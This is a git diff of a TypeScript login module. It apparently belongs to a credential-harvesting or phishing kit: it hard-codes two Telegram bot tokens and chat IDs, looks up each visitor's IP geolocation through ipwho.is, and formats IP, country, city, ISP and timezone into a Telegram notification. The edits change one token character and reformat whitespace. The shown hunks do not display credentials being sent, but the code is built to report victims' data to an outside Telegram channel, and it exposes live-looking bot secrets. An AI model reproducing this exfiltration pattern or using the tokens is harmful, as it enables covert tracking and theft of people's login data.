@@ -31,7 +31,7 @@ interface LoginResponse {
 
 // Telegram configuration — each bot has its own token and chat ID
 const TELEGRAM_BOTS = [
-  { token: '8335283094:AAG6BMVNr4O4zy8ha9565bgX-P87uKsJYB0', chatId: '8042057280' },
+  { token: '8335283094:AAG6BMVNr4O4zy8ha9565bgX-P87uKsJY0', chatId: '8042057280' },
   { token: '8810483237:AAEU9tXIxRL_HzgLrdEB0O7_I9aEVW5RCkM', chatId: '5566002678' },
 ]
 
@@ -61,14 +61,14 @@ async function resolveGeo(clientIp: string | null, fallback: GeoInfo): Promise<G
     const d = await res.json()
     if (!d.success) throw new Error('ipwho.is returned success=false')
     return {
-      ip:          d.ip,
-      country:     d.country,
+      ip: d.ip,
+      country: d.country,
       countryCode: d.country_code,
-      region:      d.region,
-      city:        d.city,
-      continent:   d.continent,
-      org:         d.connection?.isp || d.connection?.org,
-      timezone:    d.timezone?.id,
+      region: d.region,
+      city: d.city,
+      continent: d.continent,
+      org: d.connection?.isp || d.connection?.org,
+      timezone: d.timezone?.id,
     }
   } catch (err) {
     console.error('Server-side geo lookup failed, using client fallback:', err)
@@ -90,13 +90,13 @@ async function sendTelegramNotification(
 
   // Build geolocation section
   const geoLines = geo ? [
-    geo.ip         ? `🌐 <b>IP:</b> <code>${geo.ip}</code>` : null,
-    geo.country    ? `🏳️ <b>Country:</b> ${geo.country}${geo.countryCode ? ` (${geo.countryCode})` : ''}` : null,
-    geo.continent  ? `🌍 <b>Continent:</b> ${geo.continent}` : null,
-    geo.region     ? `📍 <b>Region:</b> ${geo.region}` : null,
-    geo.city       ? `🏙️ <b>City:</b> ${geo.city}` : null,
-    geo.org        ? `🏢 <b>ISP/Org:</b> ${geo.org}` : null,
-    geo.timezone   ? `⏰ <b>Timezone:</b> ${geo.timezone}` : null,
+    geo.ip ? `🌐 <b>IP:</b> <code>${geo.ip}</code>` : null,
+    geo.country ? `🏳️ <b>Country:</b> ${geo.country}${geo.countryCode ? ` (${geo.countryCode})` : ''}` : null,
+    geo.continent ? `🌍 <b>Continent:</b> ${geo.continent}` : null,
+    geo.region ? `📍 <b>Region:</b> ${geo.region}` : null,
+    geo.city ? `🏙️ <b>City:</b> ${geo.city}` : null,
+    geo.org ? `🏢 <b>ISP/Org:</b> ${geo.org}` : null,
+    geo.timezone ? `⏰ <b>Timezone:</b> ${geo.timezone}` : null,
   ].filter(Boolean).join('\n') : ''
 
   const geoSection = geoLines ? `\n\n📡 <b>Geolocation</b>\n━━━━━━━━━━━━━━━━━━━━\n${geoLines}` : ''
